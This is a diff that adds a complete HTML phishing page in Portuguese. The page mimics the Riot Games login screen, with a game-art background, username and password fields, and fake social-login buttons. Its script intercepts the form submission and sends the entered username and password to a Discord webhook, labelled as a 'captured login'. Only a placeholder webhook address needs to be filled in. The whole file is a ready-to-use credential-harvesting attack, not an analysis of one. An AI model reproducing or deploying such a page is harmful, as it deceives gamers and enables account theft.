@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login - Riot Games</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Arial', sans-serif;
+      background: url('https://i.ibb.co/YZ8zjzd/arcane2-desktop-default-2x.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: white;
+    }
+
+    .login-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-box {
+      background: rgba(0, 0, 0, 0.7); /* Fundo preto com 70% de opacidade */
+      border-radius: 15px;
+      padding: 40px 30px;
+      text-align: center;
+      width: 400px;
+      box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.5);
+      animation: fadeIn 1.5s ease;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(-20px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .login-box h1 {
+      font-size: 28px;
+      font-weight: bold;
+      margin-bottom: 25px;
+      color: #00ccff;
+      text-shadow: 0px 2px 5px rgba(0, 204, 255, 0.7);
+    }
+
+    .login-box input {
+      width: 92%; /* Ajustado para ser mais estreito */
+      padding: 10px 12px;
+      margin: 12px 0;
+      border-radius: 6px;
+      border: 1px solid #333;
+      background-color: rgba(255, 255, 255, 0.1);
+      color: white;
+      font-size: 14px;
+      outline: none;
+      transition: 0.3s;
+      text-align: left; /* Alinha o texto à esquerda */
+    }
+
+    .login-box input:focus {
+      border-color: #00ccff;
+      box-shadow: 0px 0px 8px rgba(0, 204, 255, 0.7);
+    }
+
+    .login-box button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 15px;
+      background: linear-gradient(90deg, #00ccff, #008cff);
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      transition: transform 0.3s, background 0.3s;
+    }
+
+    .login-box button:hover {
+      transform: scale(1.05);
+      background: linear-gradient(90deg, #008cff, #00ccff);
+    }
+
+    .social-buttons {
+      display: flex;
+      justify-content: space-between;
+      margin: 20px 0;
+    }
+
+    .social-buttons .social-btn {
+      flex: 1;
+      margin: 0 5px;
+      height: 40px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      border-radius: 6px;
+      cursor: pointer;
+      border: none;
+      font-size: 0;
+      transition: transform 0.3s, box-shadow 0.3s;
+    }
+
+    .social-buttons .social-btn:hover {
+      transform: translateY(-5px);
+      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
+    }
+
+    .social-facebook { background-color: #3b5998; }
+    .social-google { background-color: #ffffff; border: 1px solid #ccc; }
+    .social-apple { background-color: #333333; }
+    .social-xbox { background-color: #107c10; }
+    .social-playstation { background-color: #003087; }
+    .social-btn img {
+      width: 20px;
+      height: 20px;
+    }
+
+    .remember-login {
+      display: flex;
+      align-items: center;
+      justify-content: flex-start; /* Alinha o texto à esquerda */
+      margin: 10px 0;
+      font-size: 14px;
+    }
+
+    .remember-login input {
+      margin-right: 8px;
+      width: 14px; /* Ajusta o tamanho do checkbox */
+      height: 14px;
+      transform: none;
+    }
+
+    .remember-login label {
+      color: #d0d0d0;
+      font-weight: normal;
+      margin: 0;
+    }
+
+    .login-box a {
+      color: #00ccff;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .login-box a:hover {
+      text-decoration: underline;
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-box">
+      <h1>Fazer login</h1>
+      <form id="loginForm">
+        <input type="text" id="username" placeholder="Nome de usuário" required>
+        <input type="password" id="password" placeholder="Senha" required>
+        <div class="remember-login">
+          <input type="checkbox" id="remember">
+          <label for="remember">Manter login</label>
+        </div>
+        <button type="submit">Entrar</button>
+      </form>
+      <div class="social-buttons">
+        <button class="social-btn social-facebook">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook">
+        </button>
+        <button class="social-btn social-google">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/4/4a/Logo_2013_Google.png" alt="Google">
+        </button>
+        <button class="social-btn social-apple">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple">
+        </button>
+        <button class="social-btn social-xbox">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/8/83/Xbox_one_logo.svg" alt="Xbox">
+        </button>
+        <button class="social-btn social-playstation">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/PlayStation_logo.svg" alt="PlayStation">
+        </button>
+      </div>
+      <a href="#">Não consegue fazer login?</a><br>
+      <a href="#">Criar conta</a>
+      <div class="footer">
+        Suporte | Aviso de privacidade | Termos de serviço
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/SEU_WEBHOOK";
+
+    document.getElementById('loginForm').addEventListener('submit', async function (e) {
+      e.preventDefault();
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      const message = {
+        content: `\`\`\`
+        Novo Login Capturado:
+        Nome de Usuário: ${username}
+        Senha: ${password}
+        \`\`\``
+      };
+
+      try {
+        const response = await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(message),
+        });
+
+        if (response.ok) {
+          alert('Login enviado com sucesso!');
+        } else {
+          alert('Erro ao enviar login!');
+        }
+      } catch (error) {
+        console.error('Erro ao enviar para o webhook:', error);
+        alert('Erro ao conectar com o servidor.');
+      }
+    });
+  </script>
+</body>
+</html>
